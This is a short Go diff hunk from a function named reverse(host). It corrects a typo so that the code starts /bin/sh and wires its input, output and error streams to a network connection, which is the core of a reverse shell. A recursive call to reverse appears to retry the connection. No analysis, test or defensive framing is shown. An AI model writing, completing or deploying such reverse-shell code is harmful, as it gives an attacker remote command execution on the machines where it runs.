@@ -21,7 +21,7 @@ func reverse(host string) {
       reverse(host)
    }
    
-   cmd := exec.COmman("/bin/sh")
+   cmd := exec.Command("/bin/sh")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
    cmd.Run()
    c.Close()
